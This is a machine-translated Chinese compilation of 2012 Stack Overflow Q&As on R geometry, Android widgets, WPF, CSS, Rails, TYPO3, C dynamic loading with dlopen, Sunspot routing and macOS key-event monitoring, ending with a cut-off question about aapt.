圆的原点是`0`和`radius = 1`。如果我们从原点画一条水平线向右移动坐标`(x1,y1)=(0,0)`，`(x2,y2) = (2,0)`这条线应该与圆相交。例如

```
library(plotrix)
plot(0,0,xlim=c(-3,3),ylim=c(-2,2))
draw.circle(0,0,1)
lines(c(0,2),c(0,0)) 
```

![在此处输入图像描述](../Images/84265a915d8ed4e05861ce0a56c09383.png)

我试图找到线与圆的交点，但没有运气。我从this [wolfram page](http://mathworld.wolfram.com/Circle-LineIntersection.html)中采用了我的方法并生成了以下代码，但它似乎没有产生正确的结果。有人可以指出我的（毫无疑问）愚蠢的错误吗？

```
r <- 1
id <- 1:5
x1 <- c(0)
y1 <- c(0)
x2 <- c(2)
y2 <- c(0)
df <- data.frame(id,x1,y1,x2,y2)

df <- transform(df, dx = x2-x1)
df <- transform(df, dy = y2-y1)
df <- transform(df, dr = sqrt(dx^2+dy^2))
df <- transform(df, D  = (x1*y2)-(x2*y1))
df <- transform(df, dysign = sapply(dy,function(x) ifelse(x < 0,-1,1)))
df <- transform(df, newxplus = (D*dy + (dysign*dy) *dx*sqrt(r^2*dr^2-D^2))/dr^2)
df <- transform(df, newxneg  = (D*dy - (dysign*dy) *dx*sqrt(r^2*dr^2-D^2))/dr^2)
df <- transform(df, newyplus = (-D*dx + (abs(dy)) *sqrt(r^2*dr^2-D^2))/dr^2)
df <- transform(df, newyneg  = (-D*dx - (abs(dy)) *sqrt(r^2*dr^2-D^2))/dr^2)

# where newxplus and newxneg are the two x coordinates for the two possible intercepts
# similarly for newyplus and newyneg
df 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T00:17:01.423

您在计算`newxplus`和时打错了`newxneg`。

[您链接的 wolfram 页面](http://mathworld.wolfram.com/Circle-LineIntersection.html)`sgn*(dy)`上的符号是*应用于*值的函数，即您的列，*而不是**乘以*的列。`sgn*` *`dy``dysign`*`dysign` *`dy`***

 ***所以：

```
# df <- transform(df, newxplus = (D*dy + (dysign*dy)*dx*sqrt(r^2*dr^2-D^2))/dr^2)
df <- transform(df, newxplus = (D*dy + dysign*dx*sqrt(r^2*dr^2-D^2))/dr^2)
# df <- transform(df, newxneg  = (D*dy - (dysign*dy)*dx*sqrt(r^2*dr^2-D^2))/dr^2)
df <- transform(df, newxneg  = (D*dy - dysign*dx*sqrt(r^2*dr^2-D^2))/dr^2) 
```

给出 -1 和 +1 截距的 x 坐标。

请注意，您链接的页面是*无限*线与圆的交点，这就是您得到两个交点的原因，但您可以稍后将线的 x/y 限制应用于输出交点，以过滤您想要的交点正在使用*有限*的线。

您还提到您现在在实践中仅使用数据框（请注意，您拥有的 5 行始终相同...），但是当您编写此函数的完整版本时，我建议您预先计算该值`sqrt(r^2 * dr^2 - D^2)`，因为它用于计算 x 和 y 坐标。***

# android - 从配置活动中获取 appWidgetId 的问题

> ID：13280369
> 
> 赞同：0
> 
> 时间：2012-11-07T23:58:47.900
> 
> 标签：android, android-activity, alarmmanager, configure, appwidgetprovider

我正在创建一个带有一些小部件的 Android 应用程序。一切正常，直到我开始创建设置活动...首先，我的代码：

**[编辑]** 只是想清楚一点：捆绑包（来自intent.getExtras（））总是为空......我该怎么做才能纠正它？**[/编辑]**

```
AppWidgetProvider:

package com.br.mcsoft.atheistquotes.provider;

import com.br.mcsoft.atheistquotes.R;
import com.br.mcsoft.atheistquotes.Adapters.DBAdapter;
import com.br.mcsoft.atheistquotes.activity.QuoteActivity;
import com.br.mcsoft.atheistquotes.model.Quote;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.appwidget.AppWidgetManager;
import android.appwidget.AppWidgetProvider;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.SQLException;
import android.os.Bundle;
import android.util.Log;
import android.widget.RemoteViews;

public class WidgetProviderSmall extends AppWidgetProvider {
    private static final String TAG = "WidgetProviderSmall";
    public static final String URI_SCHEME = "widget_provider_small";
    private static Quote lastQuote = null;

    @Override
    public void onUpdate(Context context, AppWidgetManager appWidgetManager,
            int[] appWidgetIds) {
        System.out.println("Updatando...");
        super.onUpdate(context, appWidgetManager, appWidgetIds);
        final int n = appWidgetIds.length;
        for (int i = 0; i < n; i++) {
            updateData(context, i);
            System.out.println("Atualizou os dados...");
            // Cria o RemoteViews
            RemoteViews rv = new RemoteViews(context.getPackageName(),
                    R.layout.widget_layout_small);

            // Adiciona o listener do evento do botão Next...
            Intent active = new Intent(context, WidgetProviderSmall.class);
            active.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID,
                    appWidgetIds[i]);
            active.setAction(StaticHelper.ACTION_WIDGET_REFRESH);
            PendingIntent actionPendingIntent = PendingIntent.getBroadcast(
                    context, 0, active, 0);
            rv.setOnClickPendingIntent(R.id.ibtNext, actionPendingIntent);

            // Adiciona o listener do evento do clique no Widget...
            active = new Intent(context, WidgetProviderSmall.class);
            active.setAction(StaticHelper.ACTION_CLICK);
            actionPendingIntent = PendingIntent.getBroadcast(context, 0,
                    active, 0);
            rv.setOnClickPendingIntent(R.id.laySmall, actionPendingIntent);

            // Atualiza tudo
            appWidgetManager.updateAppWidget(appWidgetIds[i], rv);
        }
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);
        System.out.println("Recebeu alguma chamada...");
        if (intent.getAction().equals(StaticHelper.ACTION_WIDGET_REFRESH)) {
            // Log.i("onReceive", ACTION_WIDGET_REFRESH);
            Bundle extras = intent.getExtras();
            if (extras != null) {
                int widgetId = extras.getInt(
                        AppWidgetManager.EXTRA_APPWIDGET_ID,
                        AppWidgetManager.INVALID_APPWIDGET_ID);
                updateData(context, widgetId);
            }
        } else if (intent.getAction().equals(StaticHelper.ACTION_CLICK)) {
            Intent i = new Intent(context, QuoteActivity.class);
            Bundle b = new Bundle();
            b.putInt("QuoteId", lastQuote.getId());
            i.putExtras(b);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(i);
        }
    }

    @Override
    public void onDeleted(Context context, int[] appWidgetIds) {
        System.out.println("Ih! OnDelete!");
        Intent intent = new Intent(context, WidgetProviderSmall.class);
        Bundle extras = intent.getExtras();
        if (extras != null) {
            int widgetId = extras.getInt(AppWidgetManager.EXTRA_APPWIDGET_ID,
                    AppWidgetManager.INVALID_APPWIDGET_ID);
            AlarmManager alarms = (AlarmManager) context
                    .getSystemService(Context.ALARM_SERVICE);

            Intent widgetUpdate = new Intent();
            widgetUpdate.setAction(AppWidgetManager.ACTION_APPWIDGET_UPDATE);
            widgetUpdate.putExtra(AppWidgetManager.EXTRA_APPWIDGET_IDS,
                    new int[] { widgetId });

            PendingIntent newPending = PendingIntent.getBroadcast(context, 0,
                    intent, PendingIntent.FLAG_UPDATE_CURRENT);
            // Para o alarme...
            alarms.cancel(newPending);

            // Remove o estado armazenado...
            SharedPreferences config = context.getSharedPreferences(
                    "AtheistQuoteWidget", 0);
            SharedPreferences.Editor edit = config.edit();
            edit.remove(String.format("UpdateRate-%d", widgetId));
            edit.commit();
        }
        super.onDeleted(context, appWidgetIds);
    }

    private void updateData(Context context, int Id) {
        try {
            DBAdapter db;
            db = new DBAdapter(context);
            db.open();
            Quote q = db.getRandomQuote();
            db.close();
            lastQuote = q;

            // Verifica o tamanho e trunca o texto da citação...
            String textQuote = "\"" + q.getQuote() + "\"";
            if (textQuote.length() > 110 + 10) {
                textQuote = textQuote.substring(0, 110) + "...\" [...]";
            }

            // Cria o RemoteViews
            RemoteViews rv = new RemoteViews(context.getPackageName(),
                    R.layout.widget_layout_small);
            // Seta os campos...
            // rv.setTextViewText(R.id.txtWdgQuote, "\"" + q.getQuote() + "\"");
            rv.setTextViewText(R.id.txtWdgQuote, textQuote);
            rv.setTextViewText(R.id.txtWdgAuthor, "— "
                    + q.getAuthor().getName());

            // Atualiza tudo
            AppWidgetManager appWidgetManager = AppWidgetManager
                    .getInstance(context);
            appWidgetManager.updateAppWidget(Id, rv);
        } catch (SQLException e) {
            Log.e(TAG, e.getMessage(), e);
        }
    }
} 
```

活动：

```
package com.br.mcsoft.atheistquotes.activity;

import com.br.mcsoft.atheistquotes.R;
import com.br.mcsoft.atheistquotes.provider.WidgetProviderSmall;

import android.net.Uri;
import android.os.Bundle;
import android.os.SystemClock;
import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.appwidget.AppWidgetManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.Spinner;

public class SettingsActivity extends Activity {
    private static final String[] Times = new String[] { "5 minut",
            "10 minuts", "15 minuts", "20 minuts", "30 minuts", "1 hora",
            "2 horas" };
    private static int DEFAULT_TIME = 15;
    private int oldTime = 0;
    private int newTime;
    private Spinner spn = null;
    private SharedPreferences config = null;
    private int widgetId;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        // Inicia a excução...
        System.out.println("Entrou...");
        super.onCreate(savedInstanceState);
        System.out.println("Chamou o super e o layoyt...");
        widgetId = 0;
        // Pega o Id do Widget
        Intent intent = new Intent(this, WidgetProviderSmall.class);
        Bundle extras = intent.getExtras();
        if (extras != null) {
            System.out.println("Há extras...");
            widgetId = extras.getInt(AppWidgetManager.EXTRA_APPWIDGET_ID,
                    AppWidgetManager.INVALID_APPWIDGET_ID);
        } else {
            System.out.println("Ferrou, não há...");
            finish();
            return;
        }
        // Seta como "cancelar" preventivamente...
        Intent cancelResultValue = new Intent(this, WidgetProviderSmall.class);
        cancelResultValue.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID,
                widgetId);
        setResult(RESULT_CANCELED, cancelResultValue);
        System.out.println("Setou o cancel...");
        // Verifica o tempo atualmente setado
        config = this.getSharedPreferences("AtheistQuoteWidget", 0);
        try {
            oldTime = config.getInt(String.format("UpdateRate-%d", widgetId),
                    -1);
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("Pegou o tempo setado...");
        // Seta o Spinner...
        setContentView(R.layout.activity_settings);
        System.out.println("Chamou o layout...");
        spn = (Spinner) findViewById(R.id.spnTimes);
        ArrayAdapter<String> adp = new ArrayAdapter<String>(this,
                android.R.layout.simple_spinner_item, Times);
        adp.setDropDownViewResource(android.R.layout.simple_spinner_item);
        spn.setAdapter(adp);
        if (oldTime == 0)
            oldTime = DEFAULT_TIME;
        // Seta o tempo atual no Spinner
        if (oldTime == 5) {
            spn.setSelection(0);
        } else if (oldTime == 5) {
            spn.setSelection(1);
        } else if (oldTime == 10) {
            spn.setSelection(2);
        } else if (oldTime == 15) {
            spn.setSelection(3);
        } else if (oldTime == 20) {
            spn.setSelection(4);
        } else if (oldTime == 30) {
            spn.setSelection(5);
        } else if (oldTime == 60) {
            spn.setSelection(6);
        } else if (oldTime == 120) {
            spn.setSelection(7);
        }
        System.out.println("Setou o Spinner...");
        // Pega e seta os botões...
        Button ok = (Button) findViewById(R.id.btnOk);
        Button cancel = (Button) findViewById(R.id.btnCancel);
        ok.setOnClickListener(buttonClick);
        cancel.setOnClickListener(buttonClick);
        System.out.println("Setou os botões...");
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_settings, menu);
        return true;
    }

    private OnClickListener buttonClick = new OnClickListener() {
        public void onClick(View v) {
            if (v == (Button) findViewById(R.id.btnOk)) {
                newTime = spn.getSelectedItemPosition();
                if (newTime == oldTime) {
                    finish();
                }
                SharedPreferences.Editor configEditor = config.edit();
                configEditor.putInt(String.format("UpdateRate-%d", widgetId),
                        newTime);
                configEditor.commit();
                if (widgetId != AppWidgetManager.INVALID_APPWIDGET_ID) {
                    // tell the app widget manager that we're now configured
                    Intent i = new Intent();
                    i.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, widgetId);
                    setResult(RESULT_OK, i);

                    Intent widgetUpdate = new Intent();
                    widgetUpdate
                            .setAction(AppWidgetManager.ACTION_APPWIDGET_UPDATE);
                    widgetUpdate.putExtra(AppWidgetManager.EXTRA_APPWIDGET_IDS,
                            new int[] { widgetId });

                    // make this pending intent unique
                    widgetUpdate.setData(Uri.withAppendedPath(Uri
                            .parse(WidgetProviderSmall.URI_SCHEME + "://widget/id/"),
                            String.valueOf(widgetId)));
                    PendingIntent newPending = PendingIntent.getBroadcast(
                            getApplicationContext(), 0, widgetUpdate,
                            PendingIntent.FLAG_UPDATE_CURRENT);

                    // schedule the new widget for updating
                    AlarmManager alarms = (AlarmManager) getApplicationContext()
                            .getSystemService(Context.ALARM_SERVICE);
                    alarms.setRepeating(AlarmManager.ELAPSED_REALTIME,
                            SystemClock.elapsedRealtime(), newTime * 1000,
                            newPending);
                }
                // activity is now done
                finish();
            }
        }
    };
} 
```

“System.out.println”仅用于调试（文本是葡萄牙语，因为它是我的第一语言）。

无论如何，问题在这里显示：

```
if (extras != null) {
    System.out.println("Há extras...");
    widgetId = extras.getInt(AppWidgetManager.EXTRA_APPWIDGET_ID,
            AppWidgetManager.INVALID_APPWIDGET_ID);
} else {
    System.out.println("Ferrou, não há...");
    finish();
    return;
} 
```

它总是去其他地方......所以整个事情都没有任何错误。：/

我必须做什么才能工作？我是否必须更改 AndroidManifest.xml 或类似的东西？

谢谢！

PS：嗯...我对Android开发完全陌生...所以，如果有什么奇怪的事情，请告诉我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T19:08:11.740

解决了。

这是该死的Eclipse的错。它坚持在 AndroidManifest.XML 上显示警告，说“导出的接收者不需要许可”和/或“导出的活动不需要许可”。

所以，因为我从不喜欢警告并且总是试图解决它们，所以我在配置的活动部分放入了 AndroidManifest，这个：

```
android:exported="false" 
```

所以......它不会以任何方式工作......

嗯......无论如何，谢谢。;)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-19T13:32:44.380

试着写这个而不是你定义的意图：-

```
Bundle extras = getIntent().getExtras(); 
```

而不是这一行： -

```
 Intent intent = new Intent(this, WidgetProviderSmall.class); 
```

# wpf - 使用 xaml/wpf 中的设置器覆盖进度条的绑定值

> ID：13280375
> 
> 赞同：0
> 
> 时间：2012-11-07T23:59:11.940
> 
> 标签：wpf, xaml, progress-bar

我有以下 XAML

```
<ProgressBar Grid.Column="0" Grid.Row="0" Margin="0,1" Minimum="0" Maximum="100" Value="{Binding Progress}">
    <ProgressBar.Resources>
        <Style TargetType="{x:Type ProgressBar}">
            <Style.Triggers>
                <DataTrigger Binding="{Binding DidAllServicesRestart}" Value="False">
                    <Setter Property="Foreground" Value="DarkRed"/>
                    <Setter Property="Value" Value="100"/>
                </DataTrigger>
            </Style.Triggers>
        </Style>
    </ProgressBar.Resources>
</ProgressBar> 
```

DataTrigger 非常适合将 Foreground 设置为 DarkRed，但将进度条的值设置为 100 不起作用。我猜是因为 {Binding Progress} 覆盖了它？

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:09:18.423

你是对的，`{Binding Progress}`覆盖它。在[Dependency Property 的优先级顺序中](http://msdn.microsoft.com/en-us/library/ms743230.aspx)，本地值具有第三高优先级，而样式触发器是第六位。

> 3)**当地价值。**可以通过“包装器”属性的便利设置本地值，这也等同于在 XAML 中设置为属性或属性元素，或者通过使用特定实例的属性调用 SetValue API。如果您通过使用绑定或资源设置本地值，则它们各自的优先级就像设置了直接值一样。
> 
> ……
> 
> 6)**风格触发器。**来自页面或应用程序的样式中的触发器（这些样式可能是显式或隐式样式，但不是来自具有较低优先级的默认样式）。

# html - Chrome没有正确定位按钮

> ID：13280378
> 
> 赞同：0
> 
> 时间：2012-11-07T23:59:32.997
> 
> 标签：html, css, google-chrome

嘿伙计们，我的按钮定位有问题。似乎所有浏览器都能正常运行，我只是 chrome 有问题。

以下是图像示例：

![火狐](../Images/b2d8b57246fe273c7bdd4f3ecfdcd6dd.png) ![即7](../Images/b8cba88658ec15277a16bed9bb456dc4.png) ![即8](../Images/baf6fed0bfbf9b18317e3ee6ac70bab7.png) ![即9](../Images/35008910644fb66fc2e83650fa89a77f.png) ![铬合金](../Images/cbfbec4e99d54a456c5cdac1b19a4ae9.png)

查看 Chrome 的图片，它与左侧的框没有正确对齐。（看盒子的顶部，它比左边的盒子高1-2px）

这是我用于左侧框和输入按钮的代码：

```
#main_pres_search input[type=text] {
    width: 660px;
    float: left;
    border: 0;
    background-color: #F8F8F8;
    padding: 10px;
    border: 1px solid #C0C0C0;
    border: 1px solid #C0C0C0;
    margin-right: 10px;
    outline: 0;
    line-height: 1;
}
#main_pres_search input[type=button] {
    border: 0;
    background-color: #2a94d8;
    color: #fff;
    font-size: 16px;
    height: 37px;
    width: 48px;
    float: left;
    line-height: 1;
} 
```

这是我用过的 HTML 代码——没什么特别的。=)

```
<input type="text" name="query">
<input type="button" name="do_search" value="Go!"> 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:04:55.547

尝试将`margin-top`按钮（可能还有其父级）的（和其他边距值）设置为 0。

每个浏览器都有自己的用户代理样式表。这会导致轻微的格式差异。

您可能还想查看[Yahoo 的 Reset CSS](http://developer.yahoo.com/yui/reset/)。它将几个 css 规则重置为非常基本的值。这使您可以完全控制网站样式。

# ruby-on-rails - Rails 加入查询，选择返回空 id

> ID：13280379
> 
> 赞同：1
> 
> 时间：2012-11-07T23:59:53.450
> 
> 标签：ruby-on-rails

我正在使用带有选择的rails执行连接查询，但是结果对于连接表有空ID...

```
@result = Table.joins(:join_table).select(['join_table.id', 'name', 'random_attr', 'created_at']).where('table.random_attr = ?', @anotherresult.id).order('name ASC') 
```

结果...

```
[
    {
        random_attr: true
        created_at: "2012-10-31T02:23:07Z"
        id: null
        name: "Joe"
    },
    ....
] 
```

生成的 sql 看起来像......

```
SELECT join_table.id, name, random_attr, created_at FROM `table` INNER JOIN `join_table` ON `join_table`.`id` = `table`.`user_id` WHERE (random_attr = 9) ORDER BY name ASC; 
```

直接在 mysql 中执行此查询工作正常。

# typo3 - 在 TYPO3 中设置页面标题

> ID：13280382
> 
> 赞同：0
> 
> 时间：2012-11-08T00:00:05.553
> 
> 标签：typo3, typoscript

我有下面的代码，这使得页面标题对 seo 更友好。但是我遇到了以下问题。

```
config.noPageTitle = 1
    page.headerData {
      100 = TEXT
      100 {
        field = description
        noTrimWrap = noTrimWrap = |<title>| - Example Site</title>|
    }
} 
```

如果我有 field = title 它会显示页面标题字段，但是在新闻单页上它不起作用，因为它显示页面的名称而不是 aritle 的标题。

如果我有字段 = 描述，则新闻单默认为文章标题，但是如果我没有在我的一个页面上放置描述，那么它会显示

```
 <title> - Example Site</title> 
```

如果 description = '' 显示标题（如果它不是新闻文章），还有什么办法吗？或者我应该有另一种方法来解决这个问题吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T00:16:33.343

有许多使用 tt_news 标题作为页面标题的示例和片段。

检查一个实例：http: [//blog.chandanweb.com/typo3/display-news-title-as-page-title-in-tt_news-detail-view](http://blog.chandanweb.com/typo3/display-news-title-as-page-title-in-tt_news-detail-view)

# c - 按名称处理函数

> ID：13280384
> 
> 赞同：0
> 
> 时间：2012-11-08T00:00:21.460
> 
> 标签：c, linux, function, function-pointers

假设您创建了一个`main()`来处理您问学生的练习。

每个学生都应该使用相同的 API 编写自己的函数。并且将创建一个文件，其中包含所有函数和 main 调用它们。

可以说：`int studentname(int a, int b)`是功能模式。

我处理它的一种方法是使用指向函数的指针向量`int (*func[MAX])()`。但是你需要一个一个地完成向量`func[0]=studentname;`。

我想知道，有没有一种方法可以通过它的名字来调用一个函数？

像：`int student1(int a , int b)`，，`student2()`等。

不知何故，`main`我们可以打电话给`sscanf(funcname,"student%d",i); funcname();`.

你还有别的想法吗？也许

```
int studentname(int a, int b, char *fname)
{
    strcpy(fname, "studentname"); 
```

任何有创意的都可以！:)

谢谢！贝科

PS。我只尝试了一个函数向量，但 C 不允许我这样做！:)

`int func[2]()={{;},{;}};`

这样我就可以给每个学生一个数字，然后瞧……但没办法。不过这很有趣。

* * *

编辑：我正在使用linux。

编辑2：谢谢！我接受了一个对我有帮助的答案，但我也记录了一个完整的例子作为下面的答案。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T00:11:11.023

也许有点过于复杂，但自发的想法：

*   将所有学生源文件编译到一个共享库中，导出学生函数。
*   然后枚举所有暴露的函数，调用并测试它们。

作为备选：

*   编写一个小工具，使用预处理器定义编译所有“学生单元”，用唯一名称（“func1”、“func2”等）替换预定义的函数名称。
*   然后让该工具编写一个小单元，在执行测试等时调用所有这些函数。

还有一个想法：

*   使用 C++ 编写一个特殊的类模板，它将在对象工厂中注册派生类，并使用`extern "C"`. 不过，根据实现的不同，这可能看起来有点混乱和过于复杂。
*   然后使用工厂创建每个实例并运行代码。

* * *

`dlopen()`使用and的方法示例`dlsym()`（每个库只有一个函数还是全部 - 无关紧要）：

```
void *pluginlib = dlopen("student1.so", RTLD_NOW); // RTLD_NOW will load the file right away
if (!pluginlib)
    ; // failed to load
studentproc func = (studentproc)dlsym(pluginlib, "student1"); // this loads the function called "student1"
if (!func)
    ; // failed to resolve
func("hello world!"); // call the lib
dlclose(pluginlib); // unloads the dll (this will make all further calls invalid) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T00:26:25.937

类似于@Jamey-Sharp 提出的建议：

*   要求每个学生提供`.c`具有给定姓名/签名的输入功能的文件
*   将每个文件编译`.c`成一个共享库，以学生姓名命名，或赋予任何唯一名称。此步骤可以使用`make`简单的脚本轻松自动化。
*   制作一个简单的主机应用程序，它枚举`.so`给定目录中的所有文件，并使用`dlopen()`和`dlsym()`访问入口点函数。
*   现在您可以简单地调用每个学生的实现。

BTW，插件通常是这样实现的，不是吗？

**编辑：**这是一个工作概念证明（以及一个证明，每个学生都可以使用相同名称的入口点函数）。

这是`student1.c`：

```
#include <stdio.h>

void student_task()
{
    printf("Hello, I'm Student #1\n");    
} 
```

这是`student2.c`：

```
#include <stdio.h>

void student_task()
{
    printf("Hello, I'm Student #2\n");    
} 
```

这是主程序`tester.c`：

```
#include <stdio.h>
#include <dlfcn.h>

/* NOTE: Error handling intentionally skipped for brevity! 
 * It's not a production code!
 */

/* Type of the entry point function implemented by students */
typedef void (*entry_point_t)(void);

/* For each student we have to store... */
typedef struct student_lib_tag {
    /* .. pointer to the entry point function, */
    entry_point_t entry;
    /* and a library handle, so we can play nice and close it eventually */ 
    void* library_handle;
} student_solution_t;

void load(const char* lib_name, student_solution_t* solution)
{
    /* Again - all error handling skipped, I only want to show the idea! */

    /* Open the library. RTLD_LOCAL is quite important, it keeps the libs separated */
    solution->library_handle = dlopen(lib_name, RTLD_NOW | RTLD_LOCAL);

    /* Now we ask for 'student_task' function. Every student uses the same name.
     * strange void** is needed for C99, see dlsym() manual.
     */
    *(void**) (&solution->entry) = dlsym(solution->library_handle, "student_task");

    /* We have to keep the library open */
}

int main()
{
    /* Two entries hardcoded - you need some code here that would scan
     * the directory for .so files, allocate array dynamically and load 
     * them all.
     */
    student_solution_t solutions[2];

    /* Load both solutions */
    load("./student1.so", &solutions[0]);
    load("./student2.so", &solutions[1]);

    /* Now we can call them both, despite the same name of the entry point function! */
    (solutions[0].entry)();
    (solutions[1].entry)();

    /* Eventually it's safe to close the libs */
    dlclose(solutions[0].library_handle);
    dlclose(solutions[1].library_handle);
    return 0;
} 
```

让我们编译它：

```
czajnik@czajnik:~/test$ gcc -shared -fPIC student1.c -o student1.so -Wall
czajnik@czajnik:~/test$ gcc -shared -fPIC student2.c -o student2.so -Wall
czajnik@czajnik:~/test$ gcc tester.c -g -O0 -o tester -ldl  -Wall 
```

并看到它的工作原理：

```
czajnik@czajnik:~/test$ ./tester 
Hello, I'm Student #1
Hello, I'm Student #2 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T00:10:31.430

我会采取不同的方法：

1.  要求每个学生使用相同的函数名，并将每个学生的代码放在单独的源文件中。
2.  再编写一个源文件，其中的 a`main`调用标准名称。
3.  生成一个单独的可执行文件，从链接`main.c`到`student1.c`，然后`main.c`与`student2.c`，依此类推。您可以在 makefile 或 shell 脚本中使用通配符来自动执行此操作。

也就是说，至少在类 Unix 操作系统上，您**可以**按照您的要求进行操作。

1.  调用`dlopen(NULL)`以获取主程序中符号的句柄。
2.  传递那个句柄和你想要的函数名`dlsym`。将结果指针强制指向正确类型的函数指针，然后调用它。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-08T01:19:47.533

这是一个丑陋的预处理器黑客：

```
#Makefile

FILE_NAME=student

${FILE_NAME}: main.c
        cc -Wall -DFILE_NAME=\"${FILE_NAME}.c\" -o $@ main.c -lm 
```

老师的main.c：

```
#include <math.h>
#include <stdio.h>

#include FILE_NAME

char *my_name(void);
double my_sin(double val);

int main(void)
{
double dd;
dd = my_sin(3.1415923563);

printf("%s: %f\n", my_name(), dd);
return 0;
} 
```

学生的 .c 文件：

```
#include <math.h>

char * my_name(void);
double my_sin(double val);

char * my_name(void)
{
return "Wildplasser-1.0";
}

double my_sin(double val)
{
return sin (val);
} 
```

诀窍在于学生的 .c 文件的字面意义。

为避免这种情况，您还可以使用不同的 make 行，例如：

```
 cc -Wall -o $@ ${FILE_NAME}.c main.c -lm 
```

（当然要去掉丑陋`#include FILENAME`的）

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-08T01:37:21.743

谢谢大家。我已经接受了一个答案，它给了我解决问题的灵感。在这里，只是为了记录它，是我的完整解决方案：

文件 shamain.c

```
/* Uses shared library shalib.so
 * Compile with:
 *    gcc shamain.c -o shamain -ldl -Wall
 */

#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

int main(void)
{
  void *libstud;
  int (*student[2])(int, int);
  char fname[32];
  int i,r;

  libstud = dlopen("./shalib.so", RTLD_NOW);
  if (!libstud)
  {
    fprintf(stderr, "error: %s\n", dlerror());
    exit(EXIT_FAILURE);
  }
  dlerror();    /* Clear any existing error */

  for(i=0; i<2; i++)
  {
    sprintf(fname, "func%d", i);
    *(void **) (&student[i]) = dlsym(libstud, fname); /* c99 crap */
    //student[i] = (int (*)(int, int)) dlsym(libstud, fname); /* c89 format */
  }

  for(i=0; i<2; i++)
  {
    r=student[i](i, i);
    printf("i=%d,r=%d\n", i, r);
  }

  return 0;
} 
```

文件 shalib.c

```
/* Shared library.
 * Compile with:
 *  gcc -shared -fPIC shalib.c -o shalib.so -Wall
 */

#include <stdio.h>

int func0(int one, int jadv)
{
  printf("%d = Smith\n", one);
  return 0;
}

int func1(int one, int jadv)
{
  printf("%d = John\n", one);
  return 0;
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-11-08T00:08:57.167

我已经有一段时间没有使用共享库了，但我感觉你可以从 DLL/shlib 中提取命名函数。您能否创建一个包含所有实现的 DLL/共享库，然后从主目录按名称访问它们？

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-08T00:10:30.253

根据@william-morris 的建议，您可能会很幸运地使用`dlsym()`它来动态查找函数。（`dlsym()`可能是也可能不是在您的特定平台上使用的库调用。）

# ruby-on-rails - 带有太阳黑子和导轨的友好 SEO 网址 3

> ID：13280386
> 
> 赞同：0
> 
> 时间：2012-11-08T00:00:26.143
> 
> 标签：ruby-on-rails, ruby-on-rails-3, solr, sunspot

如何使用太阳黑子创建 SEO 友好的 url？

我想从这个转换一个搜索：

```
http://localhost:3000/restaurant?utf8=&search=newyork 
```

对于这样的事情：

```
http://localhost:3000/restaurant/newyork 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T02:36:53.170

路由器：

```
match '/restaurant/:q' => 'restaurants#search' 
```

控制器：

```
class RestaurantsController < ApplicationController
  def search
    @search = Restaurant.search do
      keywords params[:q]
    end
    @restaurants = @search.results
  end
end 
```

以生成该 URL 的方式提交表单更多地取决于您的设计判断。您可能需要使用一些 Javascript 来拦截默认提交操作以制作并重定向到自定义 URL。

# objective-c - 有没有办法识别 NSNotification / NSEvent 来自哪个应用程序？

> ID：13280387
> 
> 赞同：0
> 
> 时间：2012-11-08T00:00:42.917
> 
> 标签：objective-c, cocoa, nsnotificationcenter, nsnotification, nsevent

我已经开始收听全球`keyDown`事件。有没有办法从该事件来自哪个应用程序获取信息？

处理程序接收`NSNotification`实例并`NSEvent`成为其中的一部分。我能以某种方式从这些对象中提取这些信息吗？

听力片段：

```
[NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask handler:^(NSEvent *event){
    NSLog(@"global keyDown %@", event);
    [[NSNotificationCenter defaultCenter] postNotificationName:kKeyPressed
                                                        object:event];

}]; 
```

观察员：

```
[[NSNotificationCenter defaultCenter] addObserver:self
                                         selector:@selector(keyEventHandler:)
                                             name:kKeyPressed
                                           object:nil]; 
```

**更新**

全局按键不会从任何特定应用程序发送。我真正需要的是在事件处理程序中检查当前*活动*的应用程序：

```
[[NSWorkspace sharedWorkspace] activeApplication] 
```

这会返回`NSDictionary`我需要的信息。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T02:25:34.330

您没有发布分布式通知，也没有使用分布式通知中心。这意味着您知道通知来自当前应用程序。

同时，您自己生成通知，所以如果您*确实*需要了解应用程序，您可以添加它。

最后，您要嵌入的事件是全局键事件，它们没有关联的应用程序。除非在特殊情况下，它们不是由任何应用程序生成的，它们是由用户在键盘上键入生成的。

# android - 如何找到aapt版本

> ID：13280391
> 
> 赞同：2
> 
> 时间：2012-11-08T00:01:10.417
> 
> 标签：android, build, aapt

